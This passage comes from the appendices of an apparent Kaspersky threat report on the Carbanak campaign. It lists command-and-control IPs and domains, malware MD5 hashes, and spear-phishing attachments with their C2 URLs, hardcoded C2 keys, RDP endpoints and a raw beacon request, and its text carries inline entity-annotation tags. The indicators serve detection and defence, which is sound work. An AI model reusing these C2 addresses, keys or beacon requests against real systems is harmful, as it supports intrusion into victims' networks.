<MALWARE>Carbanak</MALWARE> used to install
<MALWARE>Carbanak</MALWARE>
31.131.17.79 2014-09 <THREAT_ACTOR>Carbanak</THREAT_ACTOR>’s Victim's logs
plugin CnC
31.131.17.81 2014-09 <THREAT_ACTOR>Carbanak</THREAT_ACTOR>’s Victim's logs CnC of other malware
plugin CnC used after <THREAT_ACTOR>Carbanak</THREAT_ACTOR>'s
infection
32dsffds8743jsdf. 2014-10 <THREAT_ACTOR>Carbanak</THREAT_ACTOR>’s 08f83d98b18d3dff16c35a20e24ed49a
com Linux CnC
TLP: White For any inquiries, please contact intelreports@kaspersky.com

30
First Source: Sample md5/Detection name/
IP/Domain name seen in Type System Comment
37.235.54.48 2014-10 Related to Victim's logs CnC of other malware
<THREAT_ACTOR>Carbanak</THREAT_ACTOR> used after <MALWARE>Carbanak</MALWARE>'s
infection
37.46.114.148 2014-10 <THREAT_ACTOR>Carbanak</THREAT_ACTOR>’s Victim's logs
Linux CnC
37.59.202.124 2014-12 <THREAT_ACTOR>Carbanak</THREAT_ACTOR>’s Internet scan
Linux CnC
5.101.146.184 2014-10 <THREAT_ACTOR>Carbanak</THREAT_ACTOR>’s Victim's logs
Linux CnC
5.135.111.89 2015-02 <THREAT_ACTOR>Carbanak</THREAT_ACTOR>´s 100d516821d99b09718b362d5a4b9a2f
Windows
backconnect
5.61.32.118 2014-10 <THREAT_ACTOR>Carbanak</THREAT_ACTOR>’s 972092CBE7791D27FC9FF6E9ACC12CC3
Windows
backconnect
5.61.38.52 2014-10 <THREAT_ACTOR>Carbanak</THREAT_ACTOR>’s 08f83d98b18d3dff16c35a20e24ed49a
Windows
backconnect
50.115.127.36 2014-10 Related to Victim's logs CnC of other malware
<THREAT_ACTOR>Carbanak</THREAT_ACTOR> used after <MALWARE>Carbanak</MALWARE>'s
infection
50.115.127.37 2014-10 Related to Victim's logs CnC of other malware
<THREAT_ACTOR>Carbanak</THREAT_ACTOR> used after <MALWARE>Carbanak</MALWARE>'s
infection
55.198.6.56 2014-10 Related to Victim's logs CnC of other malware
<THREAT_ACTOR>Carbanak</THREAT_ACTOR> used after <MALWARE>Carbanak</MALWARE>'s
infection
61.7.219.61 2014-10 Related to Victim's logs CnC of other malware
<THREAT_ACTOR>Carbanak</THREAT_ACTOR> used to install
<MALWARE>Carbanak</MALWARE>
62.75.224.229 2014-10 Related to Victim's logs CnC of other malware
<THREAT_ACTOR>Carbanak</THREAT_ACTOR> used after <MALWARE>Carbanak</MALWARE>'s
infection
66.55.133.86 2014-10 <THREAT_ACTOR>Carbanak</THREAT_ACTOR>’s 972092CBE7791D27FC9FF6E9ACC12CC3
Linux CnC
67.103.159.140 2014-08 Related to Victim's logs CnC of other malware
<THREAT_ACTOR>Carbanak</THREAT_ACTOR> used to install
<MALWARE>Carbanak</MALWARE>
69.64.48.125 2014-10 Related to Victim's logs CnC of other malware
<MALWARE>Carbanak</MALWARE> used to install
<MALWARE>Carbanak</MALWARE>
74.208.170.163 2014-10 Related to Victim's logs Used by criminals
<THREAT_ACTOR>Carbanak</THREAT_ACTOR> to control infected
machines
78.129.184.4 2014-10 Related to Victim's logs Used by criminals
<THREAT_ACTOR>Carbanak</THREAT_ACTOR> to control infected
machines
TLP: White For any inquiries, please contact intelreports@kaspersky.com

31
First Source: Sample md5/Detection name/
IP/Domain name seen in Type System Comment
79.99.6.187 2014-08 Related to Victim's logs CnC of other malware
<THREAT_ACTOR>Carbanak</THREAT_ACTOR> used to install
<MALWARE>Carbanak</MALWARE>
81.4.110.128 2014-08 Related to Victim's logs Used by criyminals
<THREAT_ACTOR>Carbanak</THREAT_ACTOR> to control infected
machines
83.16.41.202 2014-10 Related to Victim's logs Used by criminals
<THREAT_ACTOR>Carbanak</THREAT_ACTOR> to control infected
machines
83.166.234.250 2014-10 <THREAT_ACTOR>Carbanak</THREAT_ACTOR>’s F66992766D8F9204551B3C42336B4F6D
Windows
backconnect
83.246.67.58 2014-10 Related to Victim's logs CnC of other malware
<THREAT_ACTOR>Carbanak</THREAT_ACTOR> used to install
<MALWARE>Carbanak</MALWARE>
85.25.117.154 2014-10 Related to Victim's logs CnC of other malware
<THREAT_ACTOR>Carbanak</THREAT_ACTOR> used after <MALWARE>Carbanak</MALWARE>'s
infection
85.25.20.109 2014-10 Related to Victim's logs CnC of other malware
<THREAT_ACTOR>Carbanak</THREAT_ACTOR> used after <MALWARE>Carbanak</MALWARE>'s
infection
85.25.207.212 2014-10 Related to Victim's logs Used by criminals
<THREAT_ACTOR>Carbanak</THREAT_ACTOR> to control infected
machines
87.106.8.177 2014-10 Related to Victim's logs Exploits used to install
<THREAT_ACTOR>Carbanak</THREAT_ACTOR> <THREAT_ACTOR>Carbanak</THREAT_ACTOR>
87.98.153.34 2014-10 Related to Victim's logs Used by criminals
<THREAT_ACTOR>Carbanak</THREAT_ACTOR> to control infected
machines
88.198.184.241 2014-12 <THREAT_ACTOR>Carbanak</THREAT_ACTOR>’s 6AE1BB06D10F253116925371C8E3E74B
Windows
backconnect
91.194.254.38 2014-07 <THREAT_ACTOR>Carbana</THREAT_ACTOR>k’s 446c75b77836b776ec3f502fce48b014
Linux CnC
91.194.254.90 2014-09 <THREAT_ACTOR>Carbanak</THREAT_ACTOR>’s Victim's logs
Linux CnC
91.194.254.91 2014-09 <THREAT_ACTOR>Carbanak</THREAT_ACTOR>’s Victim's logs
Linux CnC
91.194.254.92 2014-07 <THREAT_ACTOR>Carbanak</THREAT_ACTOR>’s Internet scan
Linux CnC
91.194.254.93 2014-07 Carbanak’s Internet scan
Linux CnC
91.194.254.94 2014-07 <THREAT_ACTOR>Carbanak</THREAT_ACTOR>’s Internet scan
Linux CnC
91.194.254.98 2014-07 <THREAT_ACTOR>Carbanak</THREAT_ACTOR>’s Internet scan
Linux CnC
TLP: White For any inquiries, please contact intelreports@kaspersky.com

32
First Source: Sample md5/Detection name/
IP/Domain name seen in Type System Comment
93.95.102.109 2014-10 Related to Victim's logs CnC of other malware
<THREAT_ACTOR>Carbanak</THREAT_ACTOR> used after <MALWARE>Carbanak</MALWARE>'s
infection
93.95.99.232 2014-10 Related to Victim's logs CnC of other malware
<THREAT_ACTOR>Carbanak</THREAT_ACTOR> used after <MALWARE>Carbanak</MALWARE>'s
infection
94.247.178.230 2014-10 Related to Victim's logs CnC of other malware
<THREAT_ACTOR>Carbanak</THREAT_ACTOR> used after <MALWARE>Carbanak</MALWARE>'s
infection
95.0.250.113 2014-10 Related to Victim's logs CnC of other malware
<THREAT_ACTOR>Carbanak</THREAT_ACTOR> used after <MALWARE>Carbanak</MALWARE>'s
infection
adguard.name 2014-07 <THREAT_ACTOR>Carbanak</THREAT_ACTOR>’s Victim's logs
Linux CnC
beefeewhewhush- 2014-07 <MALWARE>Andromeda</MALWARE>'s Victim's logs CnC of other malware
eelu.biz C&C used to install
<MALWARE>Carbanak</MALWARE>
blizko.net 2014-07 <THREAT_ACTOR>Carbanak</THREAT_ACTOR>’s Victim's logs
Linux CnC
comixed.org 2014-12 <THREAT_ACTOR>Carbanak</THREAT_ACTOR>’s 1684a5eafd51852c43b4bca48b58980f
Linux CnC
coral-trevel.com 2014-07 <THREAT_ACTOR>Carbanak</THREAT_ACTOR>’s Internet scan
Linux CnC
datsun-auto.com 2014-04 <THREAT_ACTOR>Carbanak</THREAT_ACTOR>’s cb915d1bd7f21b29edc179092e967331
Linux CnC
di-led.com 2014-07 <THREAT_ACTOR>Carbanak</THREAT_ACTOR>’s 446c75b77836b776ec3f502fce48b014
Linux CnC
financialnewson- 2014-07 <THREAT_ACTOR>Carbanak</THREAT_ACTOR>’s 4afafa81731f8f02ba1b58073b47abdf
line.pw Linux CnC
financialwiki.pw 2014-07 <THREAT_ACTOR>Carbanak</THREAT_ACTOR>’s 4afafa81731f8f02ba1b58073b47abdf
Linux CnC
flowindaho.info 2014-07 <THREAT_ACTOR>Carbanak</THREAT_ACTOR>’s reverse IP 91.194.254.93
Linux CnC
freemsk-dns.com 2014-08 <THREAT_ACTOR>Carbanak</THREAT_ACTOR>’s reverse IP 146.185.220.200
Linux CnC
gjhhghjg6798.com 2014-10 <THREAT_ACTOR>Carbanak</THREAT_ACTOR>’s 972092CBE7791D27FC9FF6E9ACC12CC3
Linux CnC
glonass-map.com 2014-12 <THREAT_ACTOR>Carbanak</THREAT_ACTOR>’s 6AE1BB06D10F253116925371C8E3E74B
Linux CnC
great-codes.com 2014-10 <THREAT_ACTOR>Carbanak</THREAT_ACTOR>’s 0AD4892EAD67E65EC3DD4C978FCE7D92
Linux CnC
icafyfootsinso.ru 2014-08 Related to Victim's logs Used by criminals
<THREAT_ACTOR>Carbanak</THREAT_ACTOR> to control infected
machines
idedroatyxoaxi.ru 2014-08 Related to Victim's logs CnC of other malware
<THREAT_ACTOR>Carbanak</THREAT_ACTOR> used to install
<MALWARE>Carbanak</MALWARE>
TLP: White For any inquiries, please contact intelreports@kaspersky.com

33
First Source: Sample md5/Detection name/
IP/Domain name seen in Type System Comment
ivaserivaseeer.biz 2014-08 Related to Victim's logs CnC of other malware
<THREAT_ACTOR>Carbanak</THREAT_ACTOR> used to install
<MALWARE>Carbanak</MALWARE>
microloule461soft- 2014-10 <THREAT_ACTOR>Carbanak</THREAT_ACTOR>’s F66992766D8F9204551B3C42336B4F6D
c1pol361.com Linux CnC
microsoftc1pol361. 2014-10 <THREAT_ACTOR>Carbanak</THREAT_ACTOR>’s F66992766D8F9204551B3C42336B4F6D
com Linux CnC
mind-finder.com 2014-07 <THREAT_ACTOR>Carbanak</THREAT_ACTOR>’s 0AD4892EAD67E65EC3DD4C978FCE7D92
Linux CnC
operatemesscont. 2014-08 Connect to Victim's logs Used by criminals
net infected sshd to control infected
machines
paradise-plaza.com 2014-07 <THREAT_ACTOR>Carbanak</THREAT_ACTOR>’s Internet scan
Linux CnC
public-dns.us 2014-08 <THREAT_ACTOR>Carbanak</THREAT_ACTOR>’s reverse IP 146.185.220.200
Linux CnC
publics-dns.com 2014-07 <THREAT_ACTOR>Carbanak</THREAT_ACTOR>’s Internet scan
Linux CnC
systemsvc.net 2014-11 <THREAT_ACTOR>Carbanak</THREAT_ACTOR>’s reverse IP 131.72.138.18
Linux CnC
system-svc.net 2014-11 <THREAT_ACTOR>Carbanak</THREAT_ACTOR>’s reverse IP 131.72.138.18
Linux CnC
traider-pro.com 2014-12 <THREAT_ACTOR>Carbanak</THREAT_ACTOR>’s reverse IP 91.194.254.94
Linux CnC
travel-maps.info 2014-07 <THREAT_ACTOR>Carbanak</THREAT_ACTOR>’s reverse IP 91.194.254.38
Linux CnC
update-java.net 2014-08 <THREAT_ACTOR>Carbanak</THREAT_ACTOR>’s reverse IP 146.185.220.200
Linux CnC
veslike.com 2014-07 <THREAT_ACTOR>Carbanak</THREAT_ACTOR>’s Internet scan
Linux CnC
wefwe3223wfdsf. 2014-10 <THREAT_ACTOR>Carbanak</THREAT_ACTOR>’s 08f83d98b18d3dff16c35a20e24ed49a
com Linux CnC
worldnews24.pw 2014-08 <THREAT_ACTOR>Carbanak</THREAT_ACTOR>’s 551d41e2a4dd1497b3b27a91922d29cc
Linux CnC
worldnewsonline.pw 2014-08 <THREAT_ACTOR>Carbanak</THREAT_ACTOR>’s 551d41e2a4dd1497b3b27a91922d29cc
Linux CnC
TLP: White For any inquiries, please contact intelreports@kaspersky.com

34
APPENDIX 4: Spear phishing
This section contains details on spear phishing emails sent by the attackers to
infect victims.
MD5: 8fa296efaf87ff4d9179283d42372c52
Name of attachment: Соответствие ФЗ-­115 от 24.06.2014г.doc
Drops executable:
MD5: a1979aa159e0c54212122fd8acb24383 (<MALWARE>Carbanak</MALWARE>)
Compiled Mon Apr 04 20:00:57 2011 (Probably fake)
C2 on update-­java.net
C2 key 1234567812345678
RDP on 37.235.54.48:443
MD5: 665b6cb31d962aefa3037b5849889e06
Name of attachment: Запрос.doc
Drops executable:
MD5: 4afafa81731f8f02ba1b58073b47abdf (<MALWARE>Carbanak)</MALWARE>
Compiled Tue Jul 01 03:20:06 2014
Connects to:
financialnewsonline.pw/FYocDxXpn5MXsHwZX/kLUAbd3w2/uUTsarcVKYk2W3B6hnc
Z/Gafh8U1W805Lo0N/np7E3ICR6qx8keLDJZqUGXJKBDzfc6VYz9TNIlktObQ.htm
(185.10.58.175)
C2 on financialnewsonline.pw, financialwiki.pw
C2 key TXeyuryWcIuzxkWnyu
RDP on 185.10.56.59:443
MD5: 2c395f211db2d02cb544448729d0f081
Name of attachment: new.doc
Drops executable:
MD5: 551d41e2a4dd1497b3b27a91922d29cc (<MALWARE>Carbanak</MALWARE>)
Compiled Mon Aug 04 01:10:40 2014
Connects to:
http://worldnewsonline.pw/JybDHkfWGURJPuWeUpPMX/ca9BThbDim0Hdk/9YzkJS7
m8a19tzQwZxo1vvQ/r/7SHJcCm4tdpZGp.dmDwKfMjpWBM18eX8VUiimyaUZMGoClZ6
eShS9tLCKtuHvlMQ3Dc26y90FbPIua.7LGHGZCBPj.vd08DUENC5oAE4VfyUz.shtml
C2s on worldnewsonline.pw, worldnews24.pw
C2 key JDvkyfhZxkMmDSwUkqvReIvC
RDP on 185.10.56.59:443
MD5: 31e16189e9218cb131fdb13e75d0a94f
Name of attachment: Анкета-­Заявление.doc
Drops executable:
MD5: 4e107d20832fff89a41f04c4dff1739b (<MALWARE>Carbanak</MALWARE>)
C2 on public-­dns.us
C2 key 1234567812345678
RDP on 37.235.54.48:443
TLP: White For any inquiries, please contact intelreports@kaspersky.com

35
MD5: db83e301564ff613dd1ca23c30a387f0
Name of attachment: Соответствие ФЗ-­115 от 21.07.2014г.doc
Drops executable:
MD5: cb915d1bd7f21b29edc179092e967331 (<MALWARE>Carbanak</MALWARE>)
Compiled Tue Apr 08 05:44:12 2014
Connects to:
datsun-­auto.com/bDqxEs/Ta6IPJq3zqmRY-­.5/8SgGLA-­
F/I9CstBYT1rK7kx.440Sbtru.cgi?QVzF=tNM2gdtMLscx5bB4uryjM&PfpxBukmcOaD-­
Ucygbtzv4=f8fx
MD5: f88a983fc0ef5bb446ae63250e7236dd
Name of attachment: Приглашение.msg
Drops executable:
MD5: 3dc8c4af51c8c367fbe7c7feef4f6744 (<MALWARE>Carbanak</MALWARE>)
Compiled Fri Aug 08 00:48:07 2014
C2s on worldnewsonline.pw, worldnews24.pw
C2 key vfDGbiwmiqdN6E2N
RDP on 185.10.56.59:443
MD5: c4a6a111a070856c49905d815f87ab49
Name of attachment: ЧОСВЯЮООАГЖЦСЦЧОЧю
Drops executable:
MD5: cb915d1bd7f21b29edc179092e967331 (<MALWARE>Carbanak</MALWARE>)
Connects to:
GET
/cBAWFvkXi94QxShRTaVVn/YzAxD/X0sZEud.5gNItbvozI3tqT5ly9UYLVii13.bml?tlxCFi
Busj=2OVj&9GP=a5houGz&K.F=T&l0.7FBN75=nMPDrlGXq4s7cIAQ0Cl662IwVjxvsiTOlG
0d0pd
HTTP/1.1
Host: datsun-­auto.com
MD5: 86e48a9be62494bffb3b8e5ecb4a0310
Name of attachment: Приглашение.doc
Drops executable:
MD5: 3dc8c4af51c8c367fbe7c7feef4f6744 (<MALWARE>Carbanak</MALWARE>)
Compiled Fri Aug 08 00:48:07 2014
MD5: 6c7ac8dfd7bc5c2bb1a6d7aec488c298
Name of attachment: Соответствие ФЗ-­115 от 02.07.2014г..doc,
Drops executable:
MD5: cb915d1bd7f21b29edc179092e967331 (<MALWARE>Carbanak</MALWARE>)
Compiled Tue Apr 08 05:44:12 2014
Connects to:
datsun-­auto.com/bDqxEs/Ta6IPJq3zqmRY-­.5/8SgGLA-­
F/I9CstBYT1rK7kx.440Sbtru.cgi?QVzF=tNM2gdtMLscx5bB4uryjM&PfpxBukmcOaD-­
Ucygbtzv4=f8fx
TLP: White For any inquiries, please contact intelreports@kaspersky.com

36
APPENDIX 5: MD5 hashes of <MALWARE>Carbanak</MALWARE>
samples
0022c1fe1d6b036de2a08d50ac5446a5 643c0b9904b32004465b95321bb525eb
0155738045b331f44d300f4a7d08cf21 6e564dadc344cd2d55374dbb00646d1b
0275585c3b871405dd299d458724db3d 735ff7defe0aaa24e13b6795b8e85539
0ad4892ead67e65ec3dd4c978fce7d92 751d2771af1694c0d5db9d894bd134ca
0ad6da9e62a2c985156a9c53f8494171 763b335abecbd3d9a6d923a13d6c2519
1046652e0aaa682f89068731fa5e8e50 763e07083887ecb83a87c24542d70dc5
10e0699f20e31e89c3becfd8bf24cb4c 7b30231709f1ac69e4c9db584be692f0
1300432e537e7ba07840adecf38e543b 7d0bbdda98f44a5b73200a2c157077df
15a4eb525072642bb43f3c188a7c3504 7e3253abefa52aeae9b0451cfb273690
16cda323189d8eba4248c0a2f5ad0d8f 874058e8d8582bf85c115ce319c5b0af
1713e551b8118e45d6ea3f05ec1be529 88c0af9266679e655298ce19e231dff1
1a4635564172393ae9f43eab85652ba5 8ace0c156eb6f1548b96c593a15cbb25
1b9b9c8db7735f1793f981d0be556d88 933ab95dbf7eb0e9d9470a9272bfaff3
1d1ed892f62559c3f8234c287cb3437c 93e44ecfcffdbb1f7f3119251ddb7670
1e127b92f7102fbd7fa5375e4e5c67d1 972092cbe7791d27fc9ff6e9acc12cc3
1e47e12d11580e935878b0ed78d2294f 9865bb3b4e7112ec9269a98e029cf5cb
1f43a8803498482d360befc6dfab4218 9ad8c68b478e9030859d8395d3fdb870
1fd4a01932df638a8c761abacffa0207 9f455f0efe8c5ff69adcc456dcf00da6
20f8e962b2b63170b228ccaff51aeb7d a1979aa159e0c54212122fd8acb24383
26d6bb7a4e84bec672fc461487344829 a4bfd2cfbb235d869d87f5485853edae
2908afb4de41c64a45e1eb2503169108 a8dc8985226b7b2c468bb82bad3e4d76
2c6112e1e60f083467dc159ffb1ceb6d aa55dedff7f5dbe2cc4a47f2f8d44f94
2cba1a82a78f4dcbad1087c1b71588c9 ac5d3fc9da12255759a4a7e4eb3d63e7
2e2aa05a217aacf3105b4ba2288ad475 acb01930466438d3ee981cb4fc57e196
36cdf98bc79b6997dd4e3a6bed035dca acb4c5e2f92c84df15faa4846f17ff4e
36dfd1f3bc58401f7d8b56af682f2c38 b2e6d273a9b32739c9a26f267ab7d198
39012fb6f3a93897f6c5edb1a57f76a0 b328a01f5b82830cc250e0e429fca69f
3dc8c4af51c8c367fbe7c7feef4f6744 b400bb2a2f9f0ce176368dc709359d3d
407795b49789c2f9ca6eca1fbab3c73e b6c08d0db4ca1d9e16f3e164745810ff
45691956a1ba4a8ecc912aeb9f1f0612 b79f7d41e30cf7d69a4d5d19dda8942e
4afafa81731f8f02ba1b58073b47abdf bddbb91388dd2c01068cde88a5fb939e
4e107d20832fff89a41f04c4dff1739b c179ad6f118c97d3db5e04308d48f89e
4f16b33c074f1c31d26d193ec74aaa56 c1b48ca3066214a8ec988757cc3022b3
50f70e18fe0dedabefe9bf7679b6d56c c2472adbc1f251acf26b6deb8e7a174b
5443b81fbb439972de9e45d801ce907a c687867e2c92448992c0fd00a2468752
55040dd42ccf19b5af7802cba91dbd7f c77331b822ca5b78c31b637984eda029
551d41e2a4dd1497b3b27a91922d29cc cb915d1bd7f21b29edc179092e967331
56bfe560518896b0535e0e4da44266d6 cc294f8727addc5d363bb23e10be4af2
5aeecb78181f95829b6eeeefb2ce4975 d943ccb4a3c802d304ac29df259d14f2
5da203fa799d79ed5dde485c1ed6ba76 db3e8d46587d86519f46f912700372e0
608bdeb4ce66c96b7a9289f8cf57ce02 dbd7d010c4657b94f49ca85e4ff88790
6163103103cdacdc2770bd8e9081cfb4 e06a0257449fa8dc4ab8ccb6fbf2c50b
629f0657e70901e3134dcae2e2027396 e613e5252a7172329ee25525758180a4
TLP: White For any inquiries, please contact intelreports@kaspersky.com

37
e742242f28842480e5c2b3357b7fd6ab
e938f73a10e3d2afbd77dd8ecb3a3854
eaee5bf17195a03d6bf7189965ee1bdb
ef8e417e5adb2366a3279d6680c3b979
f4eddae1c0b40bfedeb89e814a2267a5
f66992766d8f9204551b3c42336b4f6d
fad3a7ea0a0c6cb8e20e43667f560d7f
fbc310a9c431577f3489237d48763eea
ff7fd55796fa66c8245c0b90157c57c7
100d516821d99b09718b362d5a4b9a2f
6ae1bb06d10f253116925371c8e3e74b
72eff79f772b4c910259e3716f1acf49
85a26581f9aadeaa6415c01de60f932d
9ad6e0db5e2f6b59f14dd55ded057b69
a70fea1e6eaa77bdfa07848712efa259
be935b4b3c620558422093d643e2edfe
c70cce41ef0e4a206b5b48fa2d460ba4
41fb85acedc691bc6033fa2c4cf6a0bc
1684a5eafd51852c43b4bca48b58980f
08f83d98b18d3dff16c35a20e24ed49a
TLP: White For any inquiries, please contact intelreports@kaspersky.com

38
Securelist, the resource Follow us
for <ORG>Kaspersky Lab</ORG> experts’
technical research,
Academy
Business
Eugene
SecureList
ThreatPost
Daily analysis, and thoughts.
Academy
Business
Eugene
ThreatPost
Daily
<ORG>Kaspersky Lab</ORG> global Website <IDENTITY>Eugene Kaspersky</IDENTITY> Blog
Daily Business
Daily
<ORG>Kaspersky Lab</ORG> B2C Blog <ORG>Kaspersky Lab</ORG> B2B Blog
Academy
Business
ThreatPost
Daily Academy
Business
Daily
<ORG>Kaspersky Lab</ORG> security news service <ORG>Kaspersky Lab</ORG> Academy
TLP: White For any inquiries, please contact intelreports@kaspersky.com

<ORG>Kaspersky Lab</ORG> HQ
39A/3 Leningradskoe Shosse
Moscow, 125212
<GEO>Russian Federation</GEO>
more contact details
Tel: +7-495-797-8700
Fax: +7-495-797-8709